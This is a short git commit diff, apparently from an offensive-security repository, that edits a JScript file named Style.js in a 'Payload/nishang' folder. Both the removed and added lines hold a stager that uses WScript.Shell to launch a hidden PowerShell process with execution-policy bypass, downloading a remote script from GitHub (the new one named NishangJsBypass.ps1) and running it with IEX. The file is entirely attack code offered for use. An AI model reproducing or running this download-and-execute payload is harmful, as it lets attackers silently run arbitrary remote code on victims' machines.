0197b6967b0139ecb9fa21ca7e8f0d6de6e36985
NotSurprised <roro8016489@gmail.com>
2020-03-30 18:38:08 +0800

    20200330

--- Payload/nishang/Style.js
+++ Payload/nishang/Style.js
@@ -1,2 +1,2 @@
-c = "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')";
+c = "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/nishang/NishangJsBypass.ps1')";
 r = new ActiveXObject("WScript.Shell").Run(c,0,true);
